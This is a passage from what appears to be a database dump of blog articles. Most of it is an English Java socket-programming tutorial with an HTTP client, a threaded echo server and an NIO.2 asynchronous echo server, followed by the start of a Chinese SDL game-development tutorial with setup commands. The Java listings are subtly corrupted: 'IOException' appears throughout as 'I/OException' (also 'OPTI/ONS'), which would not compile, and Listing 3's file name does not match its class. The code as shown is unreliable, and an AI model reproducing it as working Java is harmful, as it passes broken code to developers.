be&nbsp;<code>/</code>.</li>\r\n	<li>Obtain an&nbsp;<code>InputStream</code>&nbsp;to the server, wrap it with a&nbsp;<code>BufferedReader</code>&nbsp;and read the response line-by-line.</li>\r\n</ol>\r\n\r\n<p>Listing 1 shows the source code for this example.</p>\r\n\r\n<p>Listing 1. SimpleSocketClientExample.java</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.geekcap.javaworld.simplesocketclient;\r\n\r\nimport java.io.BufferedReader;\r\nimport java.io.InputStreamReader;\r\nimport java.io.PrintStream;\r\nimport java.net.Socket;\r\n\r\npublic class SimpleSocketClientExample\r\n{\r\n    public static void main( String[] args )\r\n    {\r\n        if( args.length &lt; 2 )\r\n        {\r\n            System.out.println( \"Usage: SimpleSocketClientExample &lt;server&gt; &lt;path&gt;\" );\r\n            System.exit( 0 );\r\n        }\r\n        String server = args[ 0 ];\r\n        String path = args[ 1 ];\r\n\r\n        System.out.println( \"Loading contents of URL: \" + server );\r\n\r\n        try\r\n        {\r\n            // Connect to the server\r\n            Socket socket = new Socket( server, 80 );\r\n\r\n            // Create input and output streams to read from and write to the server\r\n            PrintStream out = new PrintStream( socket.getOutputStream() );\r\n            BufferedReader in = new BufferedReader( new InputStreamReader( socket.getInputStream() ) );\r\n\r\n            // Follow the HTTP protocol of GET &lt;path&gt; HTTP/1.0 followed by an empty line\r\n            out.println( \"GET \" + path + \" HTTP/1.0\" );\r\n            out.println();\r\n\r\n            // Read data from the server until we finish reading the document\r\n            String line = in.readLine();\r\n            while( line != null )\r\n            {\r\n                System.out.println( line );\r\n                line = in.readLine();\r\n            }\r\n\r\n            // Close our streams\r\n            in.close();\r\n            out.close();\r\n            socket.close();\r\n        }\r\n        catch( Exception e )\r\n        {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n}</code></pre>\r\n\r\n<p>Listing 1 accepts two command-line arguments: the server to connect to (assuming that we&#39;re connecting to the server on port 80) and the resource to retrieve. It creates a&nbsp;<code>Socket</code>&nbsp;that points to the server and explicitly specifies port&nbsp;<code>80</code>. It then executes the command:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n<span style=\"color:rgb(0, 0, 0)\">GET PATH HTTP</span><span style=\"color:rgb(102, 102, 0)\">/</span><span style=\"color:rgb(0, 102, 102)\">1.0</span></pre>\r\n\r\n<p>For example:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n<span style=\"color:rgb(0, 0, 0)\">GET </span><span style=\"color:rgb(102, 102, 0)\">/</span><span style=\"color:rgb(0, 0, 0)\"> HTTP</span><span style=\"color:rgb(102, 102, 0)\">/</span><span style=\"color:rgb(0, 102, 102)\">1.0</span></pre>\r\n\r\n<p>What just happened?</p>\r\n\r\n<p>When you retrieve a web page from a web server, such as&nbsp;<code>www.google.com</code>, the HTTP client uses DNS servers to find the server&#39;s address: it starts by asking the top-level domain server for the&nbsp;<code>com</code>&nbsp;domain where the authoritative domain-name server is for the&nbsp;<code>www.google.com</code>. Then it asks that domain-name server for the IP address (or addresses) for&nbsp;<code>www.google.com</code>. Next, it opens a socket to that server on port 80. (Or, if you want to define a different port, you can do so by adding a colon followed by the port number, for example:&nbsp;<code>:8080</code>.) Finally, the HTTP client executes the specified HTTP method, such as&nbsp;<code>GET</code>,&nbsp;<code>POST</code>,&nbsp;<code>PUT</code>,&nbsp;<code>DELETE</code>,&nbsp;<code>HEAD</code>, or&nbsp;<code>OPTI/ONS</code>. Each method has its own syntax. As shown in the above code snips, the&nbsp;<code>GET</code>&nbsp;method requires a path followed by&nbsp;<code>HTTP/version number</code>&nbsp;and an empty line. If we wanted to add HTTP headers we could have done so before entering the new line.</p>\r\n\r\n<p>In Listing 1, we retrieved an&nbsp;<code>OutputStream</code>&nbsp;and wrapped it in a&nbsp;<code>PrintStream</code>&nbsp;so that we could more easily execute our text-based commands. Our code obtained an<code>InputStream</code>, wrapped that in an&nbsp;<code>InputStreamReader</code>, which converted it to a&nbsp;<code>Reader</code>, and then wrapped that in a&nbsp;<code>BufferedReader</code>. We used the&nbsp;<code>PrintStream</code>&nbsp;to execute our<code>GET</code>&nbsp;method and then used the&nbsp;<code>BufferedReader</code>&nbsp;to read the response line-by-line until we received a&nbsp;<code>null</code>&nbsp;response, indicating that the socket had been closed.</p>\r\n\r\n<p>Now execute this class and pass it the following arguments:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n<span style=\"color:rgb(0, 0, 0)\">java com</span><span style=\"color:rgb(102, 102, 0)\">.</span><span style=\"color:rgb(0, 0, 0)\">geekcap</span><span style=\"color:rgb(102, 102, 0)\">.</span><span style=\"color:rgb(0, 0, 0)\">javaworld</span><span style=\"color:rgb(102, 102, 0)\">.</span><span style=\"color:rgb(0, 0, 0)\">simplesocketclient</span><span style=\"color:rgb(102, 102, 0)\">.</span><strong>SimpleSocketClientExample</strong><span style=\"color:rgb(0, 0, 0)\"> www</span><span style=\"color:rgb(102, 102, 0)\">.</span><span style=\"color:rgb(0, 0, 0)\">javaworld</span><span style=\"color:rgb(102, 102, 0)\">.</span><span style=\"color:rgb(0, 0, 0)\">com </span><span style=\"color:rgb(102, 102, 0)\">/</span></pre>\r\n\r\n<p>You should see output similar to what&#39;s below:</p>\r\n\r\n<pre>\r\n<code class=\"language-html\">Loading contents of URL: www.javaworld.com\r\nHTTP/1.1 200 OK\r\nDate: Sun, 21 Sep 2014 22:20:13 GMT\r\nServer: Apache\r\nX-Gas_TTL: 10\r\nCache-Control: max-age=10\r\nX-GasHost: gas2.usw\r\nX-Cooking-With: Gasoline-Local\r\nX-Gasoline-Age: 8\r\nContent-Length: 168\r\nLast-Modified: Tue, 24 Jan 2012 00:09:09 GMT\r\nEtag: \"60001b-a8-4b73af4bf3340\"\r\nContent-Type: text/html\r\nVary: Accept-Encoding\r\nConnection: close\r\n</code></pre>\r\n\r\n<pre>\r\n<code>&lt;!DOCTYPE html&gt; \r\n&lt;html lang=\"en\"&gt; \r\n&lt;head&gt; &lt;meta charset=\"utf-8\" /&gt;\r\n &lt;title&gt;Gasoline Test Page&lt;/title&gt; \r\n&lt;/head&gt;\r\n &lt;body&gt; \r\n&lt;br&gt;&lt;br&gt; &lt;center&gt;Success&lt;/center&gt; &lt;/body&gt; \r\n&lt;/html&gt;</code></pre>\r\n\r\n<p>This output shows a test page on JavaWorld&#39;s website. It replied back that it speaks HTTP version 1.1 and the response is&nbsp;<code>200 OK</code>.</p>\r\n\r\n<p>Java I/O demo, Part 2: HTTP server</p>\r\n\r\n<p>We&#39;ve covered the client side and fortunately the communication aspect of the server side is just as easy. From a simplistic perspective, the process is as follows:</p>\r\n\r\n<ol>\r\n	<li>Create a&nbsp;<code>ServerSocket</code>, specifying a port to listen on.</li>\r\n	<li>Invoke the&nbsp;<code>ServerSocket</code>&#39;s&nbsp;<code>accept()</code>&nbsp;method to listen on the configured port for a client connection.</li>\r\n	<li>When a client connects to the server, the&nbsp;<code>accept()</code>&nbsp;method returns a&nbsp;<code>Socket</code>through which the server can communicate with the client. This is the same&nbsp;<code>Socket</code>class that we used for our client, so the process is the same: obtain an&nbsp;<code>InputStream</code>to read from the client and an&nbsp;<code>OutputStream</code>&nbsp;write to the client.</li>\r\n	<li>If you server needs to be scalable, you will want to pass the&nbsp;<code>Socket</code>&nbsp;to another thread to process so that your server can continue listening for additional connections.</li>\r\n	<li>Call the&nbsp;<code>ServerSocket</code>&#39;s&nbsp;<code>accept()</code>&nbsp;method again to listen for another connection.</li>\r\n</ol>\r\n\r\n<p>As you&#39;ll soon see, NIO&#39;s handling of this scenario would be a bit different. For now, though, we can directly create a&nbsp;<code>ServerSocket</code>&nbsp;by passing it a port to listen on (more about&nbsp;<code>ServerSocketFactory</code>s in the next section):</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n<span style=\"color:rgb(0, 0, 0)\">	</span><strong>ServerSocket</strong><span style=\"color:rgb(0, 0, 0)\"> serverSocket </span><span style=\"color:rgb(102, 102, 0)\">=</span><span style=\"color:rgb(0, 0, 0)\"> </span><strong>new</strong><span style=\"color:rgb(0, 0, 0)\"> </span><strong>ServerSocket</strong><span style=\"color:rgb(102, 102, 0)\">(</span><span style=\"color:rgb(0, 0, 0)\"> port </span><span style=\"color:rgb(102, 102, 0)\">);</span></pre>\r\n\r\n<p>And now we can accept incoming connections via the&nbsp;<code>accept()</code>&nbsp;method:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n<span style=\"color:rgb(0, 0, 0)\">	</span><strong>Socket</strong><span style=\"color:rgb(0, 0, 0)\"> socket </span><span style=\"color:rgb(102, 102, 0)\">=</span><span style=\"color:rgb(0, 0, 0)\"> serverSocket</span><span style=\"color:rgb(102, 102, 0)\">.</span><span style=\"color:rgb(0, 0, 0)\">accept</span><span style=\"color:rgb(102, 102, 0)\">();</span><span style=\"color:rgb(0, 0, 0)\">\r\n	</span><em>// Handle the connection ...</em></pre>\r\n\r\n<p>Multithreaded programming with sockets</p>\r\n\r\n<p>Listing 2, below, puts all of the server code so far together into a slightly more robust example that uses threads to handle multiple requests. The server shown is an&nbsp;<em>echo server</em>, meaning that it echoes back any message it receives.</p>\r\n\r\n<p>While the example in Listing 2 isn&#39;t complicated it does anticipate some of what&#39;s coming up in the next section on NIO. Pay special attention to the amount of threading code we have to write in order to build a server that can handle multiple simultaneous requests.</p>\r\n\r\n<p>Page 2 of 2</p>\r\n\r\n<p>Listing 2. SimpleSocketServer.java</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.geekcap.javaworld.simplesocketclient;\r\n\r\nimport java.io.BufferedReader;\r\nimport java.io.I/OException;\r\nimport java.io.InputStreamReader;\r\nimport java.io.PrintWriter;\r\nimport java.net.ServerSocket;\r\nimport java.net.Socket;\r\n\r\npublic class SimpleSocketServer extends Thread\r\n{\r\n    private ServerSocket serverSocket;\r\n    private int port;\r\n    private boolean running = false;\r\n\r\n    public SimpleSocketServer( int port )\r\n    {\r\n        this.port = port;\r\n    }\r\n\r\n    public void startServer()\r\n    {\r\n        try\r\n        {\r\n            serverSocket = new ServerSocket( port );\r\n            this.start();\r\n        }\r\n        catch (I/OException e)\r\n        {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public void stopServer()\r\n    {\r\n        running = false;\r\n        this.interrupt();\r\n    }\r\n\r\n    @Override\r\n    public void run()\r\n    {\r\n        running = true;\r\n        while( running )\r\n        {\r\n            try\r\n            {\r\n                System.out.println( \"Listening for a connection\" );\r\n\r\n                // Call accept() to receive the next connection\r\n                Socket socket = serverSocket.accept();\r\n\r\n                // Pass the socket to the RequestHandler thread for processing\r\n                RequestHandler requestHandler = new RequestHandler( socket );\r\n                requestHandler.start();\r\n            }\r\n            catch (I/OException e)\r\n            {\r\n                e.printStackTrace();\r\n            }\r\n        }\r\n    }\r\n\r\n    public static void main( String[] args )\r\n    {\r\n        if( args.length == 0 )\r\n        {\r\n            System.out.println( \"Usage: SimpleSocketServer &lt;port&gt;\" );\r\n            System.exit( 0 );\r\n        }\r\n        int port = Integer.parseInt( args[ 0 ] );\r\n        System.out.println( \"Start server on port: \" + port );\r\n\r\n        SimpleSocketServer server = new SimpleSocketServer( port );\r\n        server.startServer();\r\n\r\n        // Automatically shutdown in 1 minute\r\n        try\r\n        {\r\n            Thread.sleep( 60000 );\r\n        }\r\n        catch( Exception e )\r\n        {\r\n            e.printStackTrace();\r\n        }\r\n\r\n        server.stopServer();\r\n    }\r\n}\r\n\r\nclass RequestHandler extends Thread\r\n{\r\n    private Socket socket;\r\n    RequestHandler( Socket socket )\r\n    {\r\n        this.socket = socket;\r\n    }\r\n\r\n    @Override\r\n    public void run()\r\n    {\r\n        try\r\n        {\r\n            System.out.println( \"Received a connection\" );\r\n\r\n            // Get input and output streams\r\n            BufferedReader in = new BufferedReader( new InputStreamReader( socket.getInputStream() ) );\r\n            PrintWriter out = new PrintWriter( socket.getOutputStream() );\r\n\r\n            // Write out our header to the client\r\n            out.println( \"Echo Server 1.0\" );\r\n            out.flush();\r\n\r\n            // Echo lines back to the client until the client closes the connection or we receive an empty line\r\n            String line = in.readLine();\r\n            while( line != null &amp;&amp; line.length() &gt; 0 )\r\n            {\r\n                out.println( \"Echo: \" + line );\r\n                out.flush();\r\n                line = in.readLine();\r\n            }\r\n\r\n            // Close our connection\r\n            in.close();\r\n            out.close();\r\n            socket.close();\r\n\r\n            System.out.println( \"Connection closed\" );\r\n        }\r\n        catch( Exception e )\r\n        {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n}</code></pre>\r\n\r\n<p>In Listing 2 we create a new&nbsp;<code>SimpleSocketServer</code>&nbsp;instance and start the server. This is required because the&nbsp;<code>SimpleSocketServer</code>&nbsp;extends&nbsp;<code>Thread</code>&nbsp;to create a new thread to handle the blocking&nbsp;<code>accept()</code>&nbsp;call that you see in the&nbsp;<code>read()</code>&nbsp;method. The&nbsp;<code>run()</code>method sits in a loop accepting client requests and creating&nbsp;<code>RequestHandler</code>&nbsp;threads to process the request. Again, this is relatively simple code, but also involves a fair amount of threaded programming.</p>\r\n\r\n<p>Note too that the&nbsp;<code>RequestHandler</code>&nbsp;handles the client communication much like the code in Listing 1 did: it wraps the&nbsp;<code>OutputStream</code>&nbsp;with a&nbsp;<code>PrintStream</code>&nbsp;to facilitate easy writes and, similarly, wraps the&nbsp;<code>InputStream</code>&nbsp;with a&nbsp;<code>BufferedReader</code>&nbsp;for easy reads. As far as a server goes, it reads lines from the client and echoes them back to the client. If the client sends an empty line then the conversation is over and the<code>RequestHandler</code>&nbsp;closes the socket.</p>\r\n\r\n<p>Socket programming with NIO and NIO.2</p>\r\n\r\n<p>For many applications, the base Java socket programming model that we&#39;ve just explored is sufficient. For applications involving more intensive I/O or asynchronous input/output you will want to be familiar with the non-blocking APIs introduced in Java NIO and NIO.2.</p>\r\n\r\n<p>The JDK 1.4 NIO package offers the following key features:</p>\r\n\r\n<ul>\r\n	<li><strong>Channels</strong>&nbsp;are designed to support bulk transfers from one NIO buffer to another.</li>\r\n	<li><strong>Buffers</strong>&nbsp;represent a contiguous block of memory interfaced by a simple set of operations.</li>\r\n	<li><strong>Non-Blocking Input/Output</strong>&nbsp;is a set of classes that expose channels to common I/O sources like files and sockets.</li>\r\n</ul>\r\n\r\n<p>When programming with NIO, you open a channel to your destination and then read data into a&nbsp;<em>buffer</em>&nbsp;from the destination, write the data to a buffer, and send that to your destination. We&#39;ll dive into setting up a socket and obtaining a channel to it shortly, but first let&#39;s review the process of using a buffer:</p>\r\n\r\n<ol>\r\n	<li>Write data into a buffer</li>\r\n	<li>Call the buffer&#39;s&nbsp;<code>flip()</code>&nbsp;method to prepare it for reading</li>\r\n	<li>Read data from the buffer</li>\r\n	<li>Call the buffer&#39;s&nbsp;<code>clear()</code>&nbsp;or&nbsp;<code>compact()</code>&nbsp;method to prepare it to receive more data</li>\r\n</ol>\r\n\r\n<p>When data is written into the buffer, the buffer knows the amount of data written into it. It maintains three properties, whose meanings differ if the buffer is in read mode or write mode:</p>\r\n\r\n<ul>\r\n	<li><strong>Position</strong>: In&nbsp;<em>write mode</em>, the initial position is 0 and it holds the current position being written to in the buffer; after you flip a buffer to put it in&nbsp;<em>read mode</em>, it resets the position to 0 and holds the current position in the buffer being read from,</li>\r\n	<li><strong>Capacity</strong>: The fixed size of the buffer</li>\r\n	<li><strong>Limit</strong>: In&nbsp;<em>write mode</em>, the limit defines how much data can be written into the buffer; in&nbsp;<em>read mode</em>, the limit defines how much data can be read from the buffer.</li>\r\n</ul>\r\n\r\n<p>Java I/O demo, Part 3: Echo server with NIO.2</p>\r\n\r\n<p>NIO.2, which was introduced in JDK 7, extends Java&#39;s non-blocking I/O libraries to add support for filesystem tasks, such as the&nbsp;<code>java.nio.file</code>&nbsp;package and<code>java.nio.file.Path</code>&nbsp;class and exposes a new File System API. With that background in mind, let&#39;s write a new Echo Server using NIO.2&#39;s<code>AsynchronousServerSocketChannel</code>.</p>\r\n\r\n<p>More tips for using NIO and NIO.2</p>\r\n\r\n<p>&quot;NIO shines when it&#39;s used to boost processing performance, but its results are closely tied to the underlying platform. For instance, you might discover that NIO&#39;s ability to accelerate application performance depends not only on the OS, but on the specific JVM, host virtualization context, mass storage characteristics, and even data...&quot;<br />\r\n-- From &quot;Five ways to maximize Java NIO and NIO.2&quot;</p>\r\n\r\n<p>The&nbsp;<code>AsynchronousServerSocketChannel</code>&nbsp;provides a non-blocking asynchronous channel for stream-oriented listening sockets. In order to use it, we first execute its static&nbsp;<code>open()</code>&nbsp;method and then&nbsp;<code>bind()</code>&nbsp;it to a specific port. Next, we&#39;ll execute its<code>accept()</code>&nbsp;method, passing to it a class that implements the&nbsp;<code>CompletionHandler</code>interface. Most often, you&#39;ll find that&nbsp;<em>handler</em>&nbsp;created as an anonymous inner class.</p>\r\n\r\n<p>Listing 3 shows the source code for our new asynchronous Echo Server.</p>\r\n\r\n<p>Listing 3. SimpleSocketServer.java</p>\r\n\r\n<pre>\r\n<code class=\"language-java\">package com.geekcap.javaworld.nio2;\r\n\r\nimport java.io.I/OException;\r\nimport java.net.InetSocketAddress;\r\nimport java.nio.ByteBuffer;\r\nimport java.nio.channels.AsynchronousServerSocketChannel;\r\nimport java.nio.channels.AsynchronousSocketChannel;\r\nimport java.nio.channels.CompletionHandler;\r\nimport java.util.concurrent.ExecutionException;\r\nimport java.util.concurrent.TimeUnit;\r\nimport java.util.concurrent.TimeoutException;\r\n\r\npublic class NioSocketServer\r\n{\r\n    public NioSocketServer()\r\n    {\r\n        try\r\n        {\r\n            // Create an AsynchronousServerSocketChannel that will listen on port 5000\r\n            final AsynchronousServerSocketChannel listener =\r\n                    AsynchronousServerSocketChannel.open().bind(new InetSocketAddress(5000));\r\n\r\n            // Listen for a new request\r\n            listener.accept( null, new CompletionHandler&lt;AsynchronousSocketChannel,Void&gt;() {\r\n\r\n                @Override\r\n                public void completed(AsynchronousSocketChannel ch, Void att)\r\n                {\r\n                    // Accept the next connection\r\n                    listener.accept( null, this );\r\n\r\n                    // Greet the client\r\n                    ch.write( ByteBuffer.wrap( \"Hello, I am Echo Server 2020, let\'s have an engaging conversation!\\n\".getBytes() ) );\r\n\r\n                    // Allocate a byte buffer (4K) to read from the client\r\n                    ByteBuffer byteBuffer = ByteBuffer.allocate( 4096 );\r\n                    try\r\n                    {\r\n                        // Read the first line\r\n                        int bytesRead = ch.read( byteBuffer ).get( 20, TimeUnit.SECONDS );\r\n\r\n                        boolean running = true;\r\n                        while( bytesRead != -1 &amp;&amp; running )\r\n                        {\r\n                            System.out.println( \"bytes read: \" + bytesRead );\r\n\r\n                            // Make sure that we have data to read\r\n                            if( byteBuffer.position() &gt; 2 )\r\n                            {\r\n                                // Make the buffer ready to read\r\n                                byteBuffer.flip();\r\n\r\n                                // Convert the buffer into a line\r\n                                byte[] lineBytes = new byte[ bytesRead ];\r\n                                byteBuffer.get( lineBytes, 0, bytesRead );\r\n                                String line = new String( lineBytes );\r\n\r\n                                // Debug\r\n                                System.out.println( \"Message: \" + line );\r\n\r\n                                // Echo back to the caller\r\n                                ch.write( ByteBuffer.wrap( line.getBytes() ) );\r\n\r\n                                // Make the buffer ready to write\r\n                                byteBuffer.clear();\r\n\r\n                                // Read the next line\r\n                                bytesRead = ch.read( byteBuffer ).get( 20, TimeUnit.SECONDS );\r\n                            }\r\n                            else\r\n                            {\r\n                                // An empty line signifies the end of the conversation in our protocol\r\n                                running = false;\r\n                            }\r\n                        }\r\n                    }\r\n                    catch (InterruptedException e)\r\n                    {\r\n                        e.printStackTrace();\r\n                    }\r\n                    catch (ExecutionException e)\r\n                    {\r\n                        e.printStackTrace();\r\n                    }\r\n                    catch (TimeoutException e)\r\n                    {\r\n                        // The user exceeded the 20 second timeout, so close the connection\r\n                        ch.write( ByteBuffer.wrap( \"Good Bye\\n\".getBytes() ) );\r\n                        System.out.println( \"Connection timed out, closing connection\" );\r\n                    }\r\n\r\n                    System.out.println( \"End of conversation\" );\r\n                    try\r\n                    {\r\n                        // Close the connection if we need to\r\n                        if( ch.isOpen() )\r\n                        {\r\n                            ch.close();\r\n                        }\r\n                    }\r\n                    catch (I/OException e1)\r\n                    {\r\n                        e1.printStackTrace();\r\n                    }\r\n                }\r\n\r\n                @Override\r\n                public void failed(Throwable exc, Void att) {\r\n                    ///...\r\n                }\r\n            });\r\n        }\r\n        catch (I/OException e)\r\n        {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n\r\n    public static void main( String[] args )\r\n    {\r\n        NioSocketServer server = new NioSocketServer();\r\n        try\r\n        {\r\n            Thread.sleep( 60000 );\r\n        }\r\n        catch( Exception e )\r\n        {\r\n            e.printStackTrace();\r\n        }\r\n    }\r\n}</code></pre>\r\n\r\n<p>In Listing 3 we first create a new&nbsp;<code>AsynchronousServerSocketChannel</code>&nbsp;and then bind it to port 5000:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\n        final AsynchronousServerSocketChannel listener =\r\n              AsynchronousServerSocketChannel.open().bind(new InetSocketAddress(5000));	\r\n</pre>\r\n\r\n<p>From this&nbsp;<code>AsynchronousServerSocketChannel</code>, we invoke&nbsp;<code>accept()</code>&nbsp;to tell it to start listening for connections, passing to it a custom&nbsp;<code>CompletionHandler</code>&nbsp;instance. When we invoke&nbsp;<code>accept()</code>, it returns immediately. Note that this example is different from the&nbsp;<code>ServerSocket</code>&nbsp;class in Listing 1; whereas the&nbsp;<code>accept()</code>&nbsp;method blocked until a client connected to it, the&nbsp;<code>AsynchronousServerSocketChannel</code>&nbsp;<code>accept()</code>&nbsp;method handles it for us.</p>\r\n\r\n<p>The completion handler</p>\r\n\r\n<p>Our next responsibility is to create a&nbsp;<code>CompletionHandler</code>&nbsp;class and provide an implementation of the&nbsp;<code>completed()</code>&nbsp;and&nbsp;<code>failed()</code>&nbsp;methods. The&nbsp;<code>completed()</code>&nbsp;method is called when the&nbsp;<code>AsynchronousServerSocketChannel</code>&nbsp;receives a connection from a client and it includes an&nbsp;<code>AsynchronousSocketChannel</code>&nbsp;to the client. The&nbsp;<code>completed()</code>method first accepts the connection from the&nbsp;<code>AsynchronousServerSocketChannel</code>&nbsp;and then starts communicating with the client. The first thing that it does is write out a &quot;Hello&quot; message: It builds a string, converts it to a byte array, and then passes it to<code>ByteBuffer.wrap()</code>&nbsp;to construct a&nbsp;<code>ByteBuffer</code>. The&nbsp;<code>ByteBuffer</code>&nbsp;can then be passed<code>AsynchronousSocketChannel</code>&#39;s&nbsp;<code>write()</code>&nbsp;method.</p>\r\n\r\n<p>To read from the client, we create a new&nbsp;<code>ByteBuffer</code>&nbsp;by invoking its&nbsp;<code>allocate(4096)</code>(which creates a 4K buffer), then we invoke the&nbsp;<code>AsynchronousSocketChannel</code>&#39;s&nbsp;<code>read()</code>method. The&nbsp;<code>read()</code>&nbsp;returns a&nbsp;<code>Future&lt;Integer&gt;</code>&nbsp;on which we can invoke&nbsp;<code>get()</code>&nbsp;to retrieve the number of bytes read from the client. In this example, we pass&nbsp;<code>get()</code>&nbsp;a timeout value of 20 seconds: if we do not get a response in 20 seconds then the<code>get()</code>&nbsp;method will throw a&nbsp;<code>TimeoutException</code>. Our rule for this echo server is that if we observe 20 seconds of silence then we terminate the conversation.</p>\r\n\r\n<p>Futures in asynchronous computation</p>\r\n\r\n<p>&quot;The&nbsp;<code>Future&lt;V&gt;</code>&nbsp;interface represents the result of an asynchronous computation. The result is known as a&nbsp;<em>future</em>&nbsp;because it typically will not be available until some moment in the future. You can invoke methods to cancel a task, return a task&#39;s result (waiting indefinitely or for a timeout to elapse when the task hasn&#39;t finished), and determine if a task has been cancelled or has finished...&quot;<br />\r\n--From &quot;Java concurrency without the pain, Part 1&quot;</p>\r\n\r\n<p>Next we check the position of the buffer, which will be the location of the last byte received from the client. If the client sends an empty line then we receive two bytes: a carriage return and a line feed. The check ensures that if the client sends a blank line that we take it as an indicator that the client is finished with the conversation. If we have meaningful data then we call the&nbsp;<code>ByteBuffer</code>&#39;s&nbsp;<code>flip()</code>method to prepare it for reading. We create a temporary byte array to hold the number of bytes read from the client and then invoke the&nbsp;<code>ByteBuffer</code>&#39;s&nbsp;<code>get()</code>&nbsp;to load data into that byte array. Finally, we convert the byte array to a string by creating a new&nbsp;<code>String</code>&nbsp;instance. We echo the line back to the client by converting the string to a byte array, passing that to the&nbsp;<code>ByteBuffer.wrap()</code>&nbsp;method and invoking the<code>AsynchronousSocketChannel</code>&#39;s&nbsp;<code>write()</code>&nbsp;method. Now we&nbsp;<code>clear()</code>&nbsp;the&nbsp;<code>ByteBuffer</code>, which recall means that it repositions the&nbsp;<code>position</code>&nbsp;to zero and puts the&nbsp;<code>ByteBuffer</code>into write mode, and then we read the next line from the client.</p>\r\n\r\n<p>The only thing to be aware of is that the&nbsp;<code>main()</code>&nbsp;method, which creates the server, also sets up a 60 second timer to keep the application running. Because the<code>AsynchronousSocketChannel</code>&#39;s&nbsp;<code>accept()</code>&nbsp;method returns immediately, if we don&#39;t have the&nbsp;<code>Thread.sleep()</code>&nbsp;then our application will stop immediately.</p>\r\n\r\n<p>To test this out, launch the server and connect to it using a telnet client:</p>\r\n\r\n<pre style=\"margin-left:180px\">\r\ntelnet localhost 5000\r\n</pre>\r\n\r\n<p>Send a few strings to the server, observe that they are echoed back to you, and then send an empty line to terminate the conversation.</p>\r\n\r\n<p>In conclusion</p>\r\n\r\n<p>In this article I&#39;ve presented two approaches to sockets programming with Java: the traditional approach introduced with Java 1.0 and the non-blocking NIO and NIO.2 approaches introduced in Java 1.4 and Java 7, respectively. I used several iterations of a client-server example to demonstrate both the utility of basic Java I/O and some scenarios where non-blocking I/O improves and simplifies the Java socket programming model. Using non-blocking I/O, you can program networked applications to handle multiple simultaneous connections without having to manage multiple thread collections. You can also take advantage of the new server scalability that is built in to NIO and NIO.2.</p>\r\n',0,0,'Socket programming for scalable systems',66,NULL,0),(17,0,'20150613213118',2,'<p>&nbsp;<span style=\"font-size:small\">SDL是一个自由的跨平台的多媒体开发包，适用于 游戏、游戏SDK、演示软件、模拟器、 MPEG播放器和其他应用软件。关于它的详细介绍请访问它的主页http://www.libsdl.org，同时也可以通过google找到它的相关资料。<br />\r\nSDL开发的教程有很多，可以在sdl的网站上找到，其中比较全的是http://lazyfoo.net/SDL_tutorials/index.php，在上面也可以看到一些关于游戏开发的介绍。在国内，也已经有人写过SDL的开发教程，地址http://www.cppblog.com/lf426/category/6107.html?Show=All。</span></p>\r\n\r\n<p><br />\r\n<span style=\"font-size:small\">&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 本人写这个的目的是希望能提供一个C++风格的SDL学习教程。</span></p>\r\n\r\n<p><br />\r\n<span style=\"font-size:small\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 这个系列的教程用C++实现，尽量面向对象，将代码的简单可读性做为首要目标，如果没有碰到了性能问题，不会刻意去追求它，毕竟用SDL是开发2D游戏，普通2D游戏对性能的要求不是特别高。</span></p>\r\n\r\n<p><br />\r\n<span style=\"font-size:small\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 本教程中的很多思想都借鉴于OGRE这个开源3D游戏渲染引擎，如果有兴趣的话可以去它的网站上了解一下。中文：http://www.ogre3d.cn/ ，英文：http://www.ogre3d.org/。以后如果有机会的话也希望能出一个ogre游戏开发教程，^_^。</span></p>\r\n\r\n<p><br />\r\n<span style=\"font-size:small\">&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; 本人是一个SDL初学者，对SDL理解有限，同时C++的项目经验也不多，希望大家多提出改进意见，共同完善这个教程，为跟我一样想从事游戏开发而又不知如何下手的人提供一个好的入门参考。</span></p>\r\n',0,0,'SDL系列开发教程说明',90,'/upload/article/17/46cb626e-a6ca-483e-947f-5e4d2d0499fd.jpg',99),(18,0,'20150613215133',2,'<p>其实sdl开发在linux下是最简单的；但是限于玩家基本上上在windows下。所以写一款windows的开发教程；<strong>这里说的的sdl时sdl 1.X不是 2.x</strong></p>\r\n\r\n<p>安装步骤很简单：</p>\r\n\r\n<p><strong>linux（centos/ubuntu）环境下:</strong></p>\r\n\r\n<p>使用使用yum install(yum install SDL-devel SDL_ttf-devel SDL_image-devel SDL_net-devel) 或者apt-get install(sudo apt-get install libsdl1.2-dev&nbsp;libsdl-image1.2-dev&nbsp;libsdl-mixer1.2-dev&nbsp;libsdl-ttf2.0-dev&nbsp;libsdl-gfx1.2-dev)安装。</p>\r\n\r\n<p><strong>这里说一下sdl是一个主库。sdl-image图片处理的。sdl-ttf字体处理当然可以不需要，看情况而定</strong></p>\r\n\r\n<p>下面详细说以下windows下开发环境的搭建</p>\r\n\r\n<p>需要准备的东西：</p>\r\n\r\n<p><span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">mingw32（windows的linux环境模拟，不用担心编译后，一样可以作为windows程序运行）:</span>http://sourceforge.net/projects/mingw/files/</p>\r\n\r\n<p>sdl：<span style=\"color:rgb(0, 0, 0); font-family:helvetica,tahoma,arial,sans-serif; font-size:14px\">http://www.libsdl.org/release/SDL-devel-1.2.15-mingw32.tar.gz</span></p>\r\n\r\n<p><font color=\"#000000\" face=\"helvetica, tahoma, arial, sans-serif\"><span style=\"font-size:14px; line-height:22.3999996185303px\">sdl-image:</span></font><span style=\"color:rgb(0, 102, 204)\">http://www.libsdl.org/projects/SDL_image/release/SDL_image-devel-1.2.12-VC.zip</span></p>\r\n\r\n<p><strong>环境变量配置</strong></p>\r\n\r\n<pre>\r\n<code 